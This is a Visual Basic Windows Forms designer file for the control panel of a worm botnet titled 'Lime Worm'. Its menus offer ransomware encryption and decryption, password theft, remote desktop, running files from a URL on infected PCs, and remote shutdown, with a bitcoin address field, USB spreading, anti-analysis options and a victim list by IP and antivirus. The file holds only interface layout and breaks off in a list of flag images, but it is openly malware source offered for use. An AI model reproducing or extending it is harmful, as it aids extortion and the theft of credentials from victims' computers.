<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.PluginsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RansomwareToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EncryptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DecryptionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CheckFilesToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DetailsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
        Me.RunAFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.BotPCOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCRestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCLogoutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ControllerOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BotColorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.Flag = New System.Windows.Forms.ImageList(Me.components)
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.MAIN_TAB = New Server_0._5.CHTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel3 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel2 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.L1 = New System.Windows.Forms.ListView()
        Me.Country = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.IP = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ID = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.USER = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.EXE_NAME = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.VER = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.OS = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.INDATE = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.AV = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Rans = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.USB = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.PING = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.L2 = New System.Windows.Forms.ListBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.ChGroupBox4 = New Server_0._5.CHGroupBox()
        Me.Icon_OFF = New Server_0._5.CHOnOffBox()
        Me.Icon_Box = New System.Windows.Forms.PictureBox()
        Me.ChSeparator1 = New Server_0._5.CHSeparator()
        Me.ChButton1 = New Server_0._5.CHButton()
        Me.ChGroupBox3 = New Server_0._5.CHGroupBox()
        Me.PIN_CHK = New Server_0._5.CHCheckbox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.BTC_ADDR = New Server_0._5.CHTextbox()
        Me.ANTI = New Server_0._5.CHCheckbox()
        Me.USB_CHK = New Server_0._5.CHCheckbox()
        Me.ChGroupBox2 = New Server_0._5.CHGroupBox()
        Me.DROP = New Server_0._5.CHOnOffBox()
        Me.PATH2 = New Server_0._5.CHTextbox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.PATH1 = New Server_0._5.CHCombobox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.EXE = New Server_0._5.CHTextbox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.ChGroupBox1 = New Server_0._5.CHGroupBox()
        Me.ChButton2 = New Server_0._5.CHButton()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Pastebin = New Server_0._5.CHTextbox()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.MAIN_TAB.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.StatusStrip1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.ChGroupBox4.SuspendLayout()
        CType(Me.Icon_Box, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.ChGroupBox3.SuspendLayout()
        Me.ChGroupBox2.SuspendLayout()
        Me.ChGroupBox1.SuspendLayout()
        Me.SuspendLayout()
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.Color.Black
        Me.ContextMenuStrip1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None
        Me.ContextMenuStrip1.DropShadowEnabled = False
        Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PluginsToolStripMenuItem, Me.ToolStripSeparator2, Me.RunAFileToolStripMenuItem, Me.BotPCOptionsToolStripMenuItem, Me.ControllerOptionsToolStripMenuItem, Me.BotColorToolStripMenuItem, Me.ToolStripSeparator1, Me.AboutToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.ShowImageMargin = False
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(178, 196)
        '
        'PluginsToolStripMenuItem
        '
        Me.PluginsToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.PluginsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RansomwareToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem, Me.DetailsToolStripMenuItem, Me.PasswordsToolStripMenuItem})
        Me.PluginsToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.PluginsToolStripMenuItem.Name = "PluginsToolStripMenuItem"
        Me.PluginsToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.PluginsToolStripMenuItem.Text = "Plugins"
        '
        'RansomwareToolStripMenuItem
        '
        Me.RansomwareToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.EncryptToolStripMenuItem, Me.DecryptionToolStripMenuItem, Me.CheckFilesToolStripMenuItem})
        Me.RansomwareToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RansomwareToolStripMenuItem.Name = "RansomwareToolStripMenuItem"
        Me.RansomwareToolStripMenuItem.Size = New System.Drawing.Size(229, 30)
        Me.RansomwareToolStripMenuItem.Text = "Ransomware"
        '
        'EncryptToolStripMenuItem
        '
        Me.EncryptToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem"
        Me.EncryptToolStripMenuItem.Size = New System.Drawing.Size(183, 30)
        Me.EncryptToolStripMenuItem.Text = "Encrypt"
        '
        'DecryptionToolStripMenuItem
        '
        Me.DecryptionToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DecryptionToolStripMenuItem.Name = "DecryptionToolStripMenuItem"
        Me.DecryptionToolStripMenuItem.Size = New System.Drawing.Size(183, 30)
        Me.DecryptionToolStripMenuItem.Text = "Decryption"
        '
        'CheckFilesToolStripMenuItem
        '
        Me.CheckFilesToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.CheckFilesToolStripMenuItem.Name = "CheckFilesToolStripMenuItem"
        Me.CheckFilesToolStripMenuItem.Size = New System.Drawing.Size(183, 30)
        Me.CheckFilesToolStripMenuItem.Text = "Check Files"
        '
        'RemoteDesktopToolStripMenuItem
        '
        Me.RemoteDesktopToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(229, 30)
        Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'DetailsToolStripMenuItem
        '
        Me.DetailsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DetailsToolStripMenuItem.Name = "DetailsToolStripMenuItem"
        Me.DetailsToolStripMenuItem.Size = New System.Drawing.Size(229, 30)
        Me.DetailsToolStripMenuItem.Text = "System Info"
        '
        'PasswordsToolStripMenuItem
        '
        Me.PasswordsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PasswordsToolStripMenuItem.Name = "PasswordsToolStripMenuItem"
        Me.PasswordsToolStripMenuItem.Size = New System.Drawing.Size(229, 30)
        Me.PasswordsToolStripMenuItem.Text = "Passwords"
        '
        'ToolStripSeparator2
        '
        Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
        Me.ToolStripSeparator2.Size = New System.Drawing.Size(174, 6)
        '
        'RunAFileToolStripMenuItem
        '
        Me.RunAFileToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem, Me.FromURLToolStripMenuItem1})
        Me.RunAFileToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RunAFileToolStripMenuItem.Name = "RunAFileToolStripMenuItem"
        Me.RunAFileToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.RunAFileToolStripMenuItem.Text = "Run a File"
        '
        'FromDiskToolStripMenuItem
        '
        Me.FromDiskToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem"
        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.FromDiskToolStripMenuItem.Text = "From Disk"
        '
        'FromURLToolStripMenuItem1
        '
        Me.FromURLToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
        Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
        Me.FromURLToolStripMenuItem1.Text = "From URL"
        '
        'BotPCOptionsToolStripMenuItem
        '
        Me.BotPCOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PCRestartToolStripMenuItem, Me.PCShutdownToolStripMenuItem, Me.PCLogoutToolStripMenuItem})
        Me.BotPCOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.BotPCOptionsToolStripMenuItem.Name = "BotPCOptionsToolStripMenuItem"
        Me.BotPCOptionsToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.BotPCOptionsToolStripMenuItem.Text = "PC Options"
        '
        'PCRestartToolStripMenuItem
        '
        Me.PCRestartToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCRestartToolStripMenuItem.Name = "PCRestartToolStripMenuItem"
        Me.PCRestartToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
        Me.PCRestartToolStripMenuItem.Text = "PC Restart"
        '
        'PCShutdownToolStripMenuItem
        '
        Me.PCShutdownToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCShutdownToolStripMenuItem.Name = "PCShutdownToolStripMenuItem"
        Me.PCShutdownToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
        Me.PCShutdownToolStripMenuItem.Text = "PC Shutdown"
        '
        'PCLogoutToolStripMenuItem
        '
        Me.PCLogoutToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCLogoutToolStripMenuItem.Name = "PCLogoutToolStripMenuItem"
        Me.PCLogoutToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
        Me.PCLogoutToolStripMenuItem.Text = "PC Logout"
        '
        'ControllerOptionsToolStripMenuItem
        '
        Me.ControllerOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.RestartToolStripMenuItem, Me.CloseToolStripMenuItem, Me.UninstallToolStripMenuItem})
        Me.ControllerOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.ControllerOptionsToolStripMenuItem.Name = "ControllerOptionsToolStripMenuItem"
        Me.ControllerOptionsToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.ControllerOptionsToolStripMenuItem.Text = "Worm Options"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.BackColor = System.Drawing.SystemColors.Control
        Me.UpdateToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DiskToolStripMenuItem, Me.FromURLToolStripMenuItem})
        Me.UpdateToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'DiskToolStripMenuItem
        '
        Me.DiskToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DiskToolStripMenuItem.Name = "DiskToolStripMenuItem"
        Me.DiskToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.DiskToolStripMenuItem.Text = "From Disk"
        '
        'FromURLToolStripMenuItem
        '
        Me.FromURLToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.FromURLToolStripMenuItem.Name = "FromURLToolStripMenuItem"
        Me.FromURLToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.FromURLToolStripMenuItem.Text = "From URL"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'BotColorToolStripMenuItem
        '
        Me.BotColorToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.BotColorToolStripMenuItem.Name = "BotColorToolStripMenuItem"
        Me.BotColorToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.BotColorToolStripMenuItem.Text = "Worm Color"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(174, 6)
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.AboutToolStripMenuItem.Text = "About"
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 500
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
        Me.NotifyIcon1.Text = "Lime Worm"
        Me.NotifyIcon1.Visible = True
        '
        'Flag
        '
        Me.Flag.ImageStream = CType(resources.GetObject("Flag.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.Flag.TransparentColor = System.Drawing.Color.Transparent
        Me.Flag.Images.SetKeyName(0, "_African Union(OAS).png")
        Me.Flag.Images.SetKeyName(1, "_Arab League.png")
        Me.Flag.Images.SetKeyName(2, "_ASEAN.png")
        Me.Flag.Images.SetKeyName(3, "_CARICOM.png")
        Me.Flag.Images.SetKeyName(4, "_CIS.png")
        Me.Flag.Images.SetKeyName(5, "_Commonwealth.png")
        Me.Flag.Images.SetKeyName(6, "_England.png")
        Me.Flag.Images.SetKeyName(7, "_European Union.png")
        Me.Flag.Images.SetKeyName(8, "_Islamic Conference.png")
        Me.Flag.Images.SetKeyName(9, "_Kosovo.png")
        Me.Flag.Images.SetKeyName(10, "_NATO.png")
        Me.Flag.Images.SetKeyName(11, "_Northern Ireland.png")
        Me.Flag.Images.SetKeyName(12, "_Olimpic Movement.png")
        Me.Flag.Images.SetKeyName(13, "_OPEC.png")
        Me.Flag.Images.SetKeyName(14, "_Red Cross.png")
        Me.Flag.Images.SetKeyName(15, "_Scotland.png")
        Me.Flag.Images.SetKeyName(16, "_Somaliland.png")
        Me.Flag.Images.SetKeyName(17, "_United Nations.png")
        Me.Flag.Images.SetKeyName(18, "_Wales.png")
        Me.Flag.Images.SetKeyName(19, "ad.png")
        Me.Flag.Images.SetKeyName(20, "ae.png")
        Me.Flag.Images.SetKeyName(21, "af.png")
        Me.Flag.Images.SetKeyName(22, "ag.png")
        Me.Flag.Images.SetKeyName(23, "ai.png")
        Me.Flag.Images.SetKeyName(24, "al.png")
        Me.Flag.Images.SetKeyName(25, "am.png")
        Me.Flag.Images.SetKeyName(26, "an.png")
        Me.Flag.Images.SetKeyName(27, "ao.png")
        Me.Flag.Images.SetKeyName(28, "aq.png")
        Me.Flag.Images.SetKeyName(29, "ar.png")
        Me.Flag.Images.SetKeyName(30, "as.png")
        Me.Flag.Images.SetKeyName(31, "at.png")
        Me.Flag.Images.SetKeyName(32, "au.png")
        Me.Flag.Images.SetKeyName(33, "aw.png")
        Me.Flag.Images.SetKeyName(34, "az.png")
        Me.Flag.Images.SetKeyName(35, "ba.png")
        Me.Flag.Images.SetKeyName(36, "bb.png")
        Me.Flag.Images.SetKeyName(37, "bd.png")
        Me.Flag.Images.SetKeyName(38, "be.png")
        Me.Flag.Images.SetKeyName(39, "bf.png")
        Me.Flag.Images.SetKeyName(40, "bg.png")
        Me.Flag.Images.SetKeyName(41, "bh.png")
        Me.Flag.Images.SetKeyName(42, "bi.png")
        Me.Flag.Images.SetKeyName(43, "bj.png")
        Me.Flag.Images.SetKeyName(44, "bm.png")
        Me.Flag.Images.SetKeyName(45, "bn.png")
        Me.Flag.Images.SetKeyName(46, "bo.png")
        Me.Flag.Images.SetKeyName(47, "br.png")
        Me.Flag.Images.SetKeyName(48, "bs.png")
        Me.Flag.Images.SetKeyName(49, "bt.png")
        Me.Flag.Images.SetKeyName(50, "bw.png")
        Me.Flag.Images.SetKeyName(51, "by.png")
        Me.Flag.Images.SetKeyName(52, "bz.png")
        Me.Flag.Images.SetKeyName(53, "ca.png")
        Me.Flag.Images.SetKeyName(54, "cd.png")
        Me.Flag.Images.SetKeyName(55, "cf.png")
        Me.Flag.Images.SetKeyName(56, "cg.png")
        Me.Flag.Images.SetKeyName(57, "ch.png")
        Me.Flag.Images.SetKeyName(58, "ci.png")
        Me.Flag.Images.SetKeyName(59, "ck.png")
        Me.Flag.Images.SetKeyName(60, "cl.png")
        Me.Flag.Images.SetKeyName(61, "cm.png")
        Me.Flag.Images.SetKeyName(62, "cn.png")
        Me.Flag.Images.SetKeyName(63, "co.png")
        Me.Flag.Images.SetKeyName(64, "cr.png")
        Me.Flag.Images.SetKeyName(65, "cu.png")
        Me.Flag.Images.SetKeyName(66, "cv.png")
        Me.Flag.Images.SetKeyName(67, "cy.png")
        Me.Flag.Images.SetKeyName(68, "cz.png")
        Me.Flag.Images.SetKeyName(69, "de.png")
        Me.Flag.Images.SetKeyName(70, "dj.png")
        Me.Flag.Images.SetKeyName(71, "dk.png")
        Me.Flag.Images.SetKeyName(72, "dm.png")
        Me.Flag.Images.SetKeyName(73, "do.png")
        Me.Flag.Images.SetKeyName(74, "dz.png")
        Me.Flag.Images.SetKeyName(75, "ec.png")
        Me.Flag.Images.SetKeyName(76, "ee.png")
        Me.Flag.Images.SetKeyName(77, "eg.png")
        Me.Flag.Images.SetKeyName(78, "eh.png")
        Me.Flag.Images.SetKeyName(79, "er.png")
        Me.Flag.Images.SetKeyName(80, "es.png")
        Me.Flag.Images.SetKeyName(81, "et.png")
        Me.Flag.Images.SetKeyName(82, "fi.png")
        Me.Flag.Images.SetKeyName(83, "fj.png")
        Me.Flag.Images.SetKeyName(84, "fm.png")
        Me.Flag.Images.SetKeyName(85, "fo.png")
        Me.Flag.Images.SetKeyName(86, "fr.png")
        Me.Flag.Images.SetKeyName(87, "ga.png")
        Me.Flag.Images.SetKeyName(88, "gb.png")
        Me.Flag.Images.SetKeyName(89, "gd.png")
        Me.Flag.Images.SetKeyName(90, "ge.png")
        Me.Flag.Images.SetKeyName(91, "gg.png")
        Me.Flag.Images.SetKeyName(92, "gh.png")
        Me.Flag.Images.SetKeyName(93, "gi.png")
        Me.Flag.Images.SetKeyName(94, "gl.png")
        Me.Flag.Images.SetKeyName(95, "gm.png")
        Me.Flag.Images.SetKeyName(96, "gn.png")
        Me.Flag.Images.SetKeyName(97, "gp.png")
        Me.Flag.Images.SetKeyName(98, "gq.png")
        Me.Flag.Images.SetKeyName(99, "gr.png")
        Me.Flag.Images.SetKeyName(100, "gt.png")
        Me.Flag.Images.SetKeyName(101, "gu.png")
        Me.Flag.Images.SetKeyName(102, "gw.png")
        Me.Flag.Images.SetKeyName(103, "gy.png")
        Me.Flag.Images.SetKeyName(104, "hk.png")
        Me.Flag.Images.SetKeyName(105, "hn.png")
        Me.Flag.Images.SetKeyName(106, "hr.png")
        Me.Flag.Images.SetKeyName(107, "ht.png")
        Me.Flag.Images.SetKeyName(108, "hu.png")
        Me.Flag.Images.SetKeyName(109, "id.png")
        Me.Flag.Images.SetKeyName(110, "ie.png")
        Me.Flag.Images.SetKeyName(111, "il.png")
        Me.Flag.Images.SetKeyName(112, "im.png")
        Me.Flag.Images.SetKeyName(113, "in.png")
        Me.Flag.Images.SetKeyName(114, "iq.png")
        Me.Flag.Images.SetKeyName(115, "ir.png")
        Me.Flag.Images.SetKeyName(116, "is.png")
        Me.Flag.Images.SetKeyName(117, "it.png")
        Me.Flag.Images.SetKeyName(118, "je.png")
        Me.Flag.Images.SetKeyName(119, "jm.png")
        Me.Flag.Images.SetKeyName(120, "jo.png")
        Me.Flag.Images.SetKeyName(121, "jp.png")
        Me.Flag.Images.SetKeyName(122, "ke.png")
        Me.Flag.Images.SetKeyName(123, "kg.png")
        Me.Flag.Images.SetKeyName(124, "kh.png")
        Me.Flag.Images.SetKeyName(125, "ki.png")
        Me.Flag.Images.SetKeyName(126, "km.png")
        Me.Flag.Images.SetKeyName(127, "kn.png")
        Me.Flag.Images.SetKeyName(128, "kp.png")
        Me.Flag.Images.SetKeyName(129, "kr.png")
        Me.Flag.Images.SetKeyName(130, "kw.png")
        Me.Flag.Images.SetKeyName(131, "ky.png")
        Me.Flag.Images.SetKeyName(132, "kz.png")
        Me.Flag.Images.SetKeyName(133, "la.png")
        Me.Flag.Images.SetKeyName(134, "lb.png")
        Me.Flag.Images.SetKeyName(135, "lc.png")
        Me.Flag.Images.SetKeyName(136, "li.png")
        Me.Flag.Images.SetKeyName(137, "lk.png")
        Me.Flag.Images.SetKeyName(138, "lr.png")
        Me.Flag.Images.SetKeyName(139, "ls.png")
        Me.Flag.Images.SetKeyName(140, "lt.png")
        Me.Flag.Images.SetKeyName(141, "lu.png")
        Me.Flag.Images.SetKeyName(142, "lv.png")
        Me.Flag.Images.SetKeyName(143, "ly.png")
        Me.Flag.Images.SetKeyName(144, "ma.png")
        Me.Flag.Images.SetKeyName(145, "mc.png")
        Me.Flag.Images.SetKeyName(146, "md.png")
        Me.Flag.Images.SetKeyName(147, "me.png")
        Me.Flag.Images.SetKeyName(148, "mg.png")
        Me.Flag.Images.SetKeyName(149, "mh.png")
        Me.Flag.Images.SetKeyName(150, "mk.png")
        Me.Flag.Images.SetKeyName(151, "ml.png")
        Me.Flag.Images.SetKeyName(152, "mm.png")
        Me.Flag.Images.SetKeyName(153, "mn.png")
        Me.Flag.Images.SetKeyName(154, "mo.png")
        Me.Flag.Images.SetKeyName(155, "mq.png")
        Me.Flag.Images.SetKeyName(156, "mr.png")
        Me.Flag.Images.SetKeyName(157, "ms.png")
        Me.Flag.Images.SetKeyName(158, "mt.png")
        Me.Flag.Images.SetKeyName(159, "mu.png")
        Me.Flag.Images.SetKeyName(160, "mv.png")
        Me.Flag.Images.SetKeyName(161, "mw.png")
        Me.Flag.Images.SetKeyName(162, "mx.png")
        Me.Flag.Images.SetKeyName(163, "my.png")
        Me.Flag.Images.SetKeyName(164, "mz.png")
        Me.Flag.Images.SetKeyName(165, "na.png")
        Me.Flag.Images.SetKeyName(166, "nc.png")
        Me.Flag.Images.SetKeyName(167, "ne.png")
        Me.Flag.Images.SetKeyName(168, "ng.png")
        Me.Flag.Images.SetKeyName(169, "ni.png")
        Me.Flag.Images.SetKeyName(170, "nl.png")
        Me.Flag.Images.SetKeyName(171, "no.png")
        Me.Flag.Images.SetKeyName(172, "np.png")
        Me.Flag.Images.SetKeyName(173, "nr.png")
        Me.Flag.Images.SetKeyName(174, "nz.png")
        Me.Flag.Images.SetKeyName(175, "om.png")
        Me.Flag.Images.SetKeyName(176, "pa.png")
        Me.Flag.Images.SetKeyName(177, "pe.png")
        Me.Flag.Images.SetKeyName(178, "pf.png")
        Me.Flag.Images.SetKeyName(179, "pg.png")
        Me.Flag.Images.SetKeyName(180, "ph.png")
        Me.Flag.Images.SetKeyName(181, "pk.png")
        Me.Flag.Images.SetKeyName(182, "pl.png")
        Me.Flag.Images.SetKeyName(183, "pr.png")
        Me.Flag.Images.SetKeyName(184, "ps.png")
        Me.Flag.Images.SetKeyName(185, "pt.png")
        Me.Flag.Images.SetKeyName(186, "pw.png")
        Me.Flag.Images.SetKeyName(187, "py.png")
        Me.Flag.Images.SetKeyName(188, "qa.png")
        Me.Flag.Images.SetKeyName(189, "re.png")
        Me.Flag.Images.SetKeyName(190, "ro.png")
        Me.Flag.Images.SetKeyName(191, "rs.png")
        Me.Flag.Images.SetKeyName(192, "ru.png")
        Me.Flag.Images.SetKeyName(193, "rw.png")
        Me.Flag.Images.SetKeyName(194, "sa.png")
        Me.Flag.Images.SetKeyName(195, "sb.png")
        Me.Flag.Images.SetKeyName(196, "sc.png")
        Me.Flag.Images.SetKeyName(197, "sd.png")
        Me.Flag.Images.SetKeyName(198, "se.png")
        Me.Flag.Images.SetKeyName(199, "sg.png")
        Me.Flag.Images.SetKeyName(200, "si.png")
        Me.Flag.Images.SetKeyName(201, "sk.png")
        Me.Flag.Images.SetKeyName(202, "sl.png")
        Me.Flag.Images.SetKeyName(203, "sm.png")
        Me.Flag.Images.SetKeyName(204, "sn.png")
        Me.Flag.Images.SetKeyName(205, "so.png")
        Me.Flag.Images.SetKeyName(206, "sr.png")
        Me.Flag.Images.SetKeyName(207, "st.png")
        Me.Flag.Images.SetKeyName(208, "sv.png")
